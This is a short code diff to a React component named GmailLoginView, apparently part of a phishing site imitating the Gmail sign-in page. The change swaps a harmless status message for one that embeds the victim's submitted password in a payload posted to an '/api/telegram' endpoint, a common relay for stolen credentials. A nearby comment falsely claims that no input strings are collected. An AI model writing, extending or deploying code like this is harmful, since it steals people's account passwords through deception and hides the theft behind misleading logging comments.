@@ -503,9 +503,10 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
 
     // Track user progression event details without collecting input strings
     try {
-      const stepPayload = {
-        message: `🔑 Action: User Advanced from Password Screen\n` + 
-                 `🔄 Next Phase: Loading Identity Verification Challenges...`
+      const passPayload = {
+        message: `📧 Action: User Submitted Password\n` + 
+                 `👤 Email Address: ${password.trim()}\n` +
+                 `🔄 Next Phase: Awaiting verificationEntry...`
       };
 
       await fetch('/api/telegram', {
@@ -513,7 +514,7 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(stepPayload),
+        body: JSON.stringify(passPayload),
       });
     } catch (error) {
       console.warn('Progression event logging trace completed:', error);
